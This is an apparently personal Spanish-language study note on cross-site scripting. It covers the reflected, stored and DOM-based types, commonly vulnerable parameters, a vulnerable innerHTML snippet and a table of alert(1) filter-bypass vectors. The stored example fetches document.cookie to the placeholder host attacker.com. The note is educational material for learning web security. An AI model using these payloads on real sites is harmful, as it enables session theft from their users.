
---
Tags: #js #javascript #dom #database #inyección #injection #explotación #Exploitation #wrappers 

---
# Definición

**[[XSS - Cross-Site Scripting]]** es una vulnerabilidad que permite a un atacante inyectar código JavaScript malicioso en páginas web vistas por otros usuarios. Se explota al reflejar o almacenar contenido no validado que luego se interpreta como código en el navegador de la víctima.

🧠 **Objetivo**: ejecutar código en el navegador de la víctima para robar cookies, secuestrar sesiones, redirigir a sitios maliciosos o hacer keylogging.

---

# 📚 Tipos de XSS

|Tipo|Descripción|Persistencia|Ejemplo común|
|---|---|---|---|
|**Reflejado (Reflected)**|El payload se refleja directamente en la respuesta HTTP.|No persistente.|Parámetros en la URL o formularios.|
|**Almacenado (Stored)**|El payload se almacena en la base de datos o en el servidor.|Persistente.|Comentarios, foros, perfiles.|
|**DOM-Based**|La vulnerabilidad está en el lado del cliente (JS manipula datos inseguros).|Dependiente del DOM.|`document.location`, `document.write`, etc.|

---

# 🧪 Parámetros más comunes vulnerables a XSS

|Parámetro típico|Contexto|
|---|---|
|`search`, `q`, `query`|Buscadores internos|
|`page`, `next`|Navegación|
|`comment`, `msg`, `feedback`|Formularios|
|`redirect`, `url`|Redirecciones|
|`username`, `name`|Campos visibles en perfiles o saludos|

---

# 🧰 Ejemplos por tipo de XSS

### 1️⃣ Reflected XSS

```http
GET /search?q=<script>alert(1)</script>
```

📍 Inyectado en la URL. Si la respuesta del servidor refleja ese contenido, se ejecuta.

---

### 2️⃣ Stored XSS

`<!-- Comentario malicioso en un foro -->`
```js
script>fetch('https://attacker.com?cookie=' + document.cookie)</script>
```

📦 Queda guardado en la base de datos. Todos los usuarios que vean ese comentario ejecutan el script.

---

### 3️⃣ DOM-Based XSS

`// Código vulnerable en el cliente:`
```js
let param = new URLSearchParams(location.search).get("name"); document.body.innerHTML = "Hola " + param;
```

🔁 Si accedes con:

```http
/page.html?name=<img src=x onerror=alert(1)>
```

💥 Se ejecuta porque `innerHTML` interpreta etiquetas.

---

## 🔎 Vectores de ataque comunes

| Vector                               | Contexto                          |
| ------------------------------------ | --------------------------------- |
| `<script>alert(1)</script>`          | Básico (si hay ejecución directa) |
| `<img src=x onerror=alert(1)>`       | Bypassea filtros básicos          |
| `<svg/onload=alert(1)>`              | Atributo con eventos              |
| `"><script>alert(1)</script>`        | Escapar comillas HTML             |
| `<iframe src="javascript:alert(1)">` | Vía `iframe`                      |
